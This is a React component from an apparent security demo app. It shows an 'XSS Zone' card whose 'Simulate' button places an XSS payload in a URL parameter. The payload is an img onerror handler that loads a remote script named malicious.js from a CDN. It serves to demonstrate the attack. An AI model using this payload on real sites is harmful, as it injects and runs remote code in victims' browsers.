import {FC, PropsWithChildren} from 'react';
import Card from '@oxygen-ui/react/Card';
import Typography from '@oxygen-ui/react/Typography';
import Box from '@oxygen-ui/react/Box';
import Button from '@oxygen-ui/react/Button';
import {useSearchParams} from 'react-router-dom';
import './xss-zone.css';

export type XSSZoneProps = PropsWithChildren;

const XSSZone: FC<XSSZoneProps> = () => {
  let [, setSearchParams] = useSearchParams();

  const handleSimulateXSSURLAttack = (): void => {
    const remoteScriptUrl =
      'https://cdn.statically.io/gh/brionmario/react-security/54704c58bcfa12c3661607fa01426c779c933c2f/apps/client/public/resources/malicious.js';

    setSearchParams(params => {
      params.set(
        'callbackText',
        `<img src="invalid-image.jpg" onerror="this.onerror=null;this.src='';document.head.appendChild(document.createElement('script')).src='${remoteScriptUrl}';">`,
      );

      params.set('callback', 'https://abc.com');

      return params;
    });
  };

  return (
    <Card className="XSSZoneCard">
      <Box display="flex" flexDirection="column" gap={2}>
        <Box>
          <Typography gutterBottom variant="h5" component="div">
            XSS Zone
          </Typography>
          <Typography color="text.secondary" variant="body2">
            This is a secure zone where you can safely test and demonstrate XSS vulnerabilities.
          </Typography>
        </Box>
        <Box>
          <Box display="flex" flexDirection="row" alignItems="center" justifyContent="space-between" sx={{mt: 1}}>
            <Typography variant="body" sx={{fontWeight: '500'}} color="text.secondary">
              URL XSS Attack
            </Typography>
            <Button
              variant="contained"
              color="primary"
              size="small"
              sx={{pl: 1, pr: 1, pt: 0.5, pb: 0.5, fontSize: '0.7rem'}}
              onClick={handleSimulateXSSURLAttack}
            >
              Simulate
            </Button>
          </Box>
        </Box>
      </Box>
    </Card>
  );
};

export default XSSZone;
